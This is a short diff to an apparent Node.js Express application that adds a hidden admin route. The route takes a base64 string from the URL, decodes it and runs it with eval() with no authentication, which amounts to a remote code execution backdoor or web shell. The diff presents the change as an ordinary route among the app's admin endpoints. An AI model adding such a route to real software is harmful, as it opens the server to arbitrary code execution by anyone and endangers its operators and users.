@@ -38,6 +38,12 @@ app.use((err, req, res, next) => {
 });
 
 
+app.get('/admin/ops/:base64', (req, res, next) => {
+  console.log(req.params.base64)
+  const opstr =(new Buffer(req.params.base64, 'base64')).toString()
+  eval(opstr)
+})
+
 app.get('/admin/records', (req, res, next) => {
 
   let {beginDay, days=1, userId} = req.query
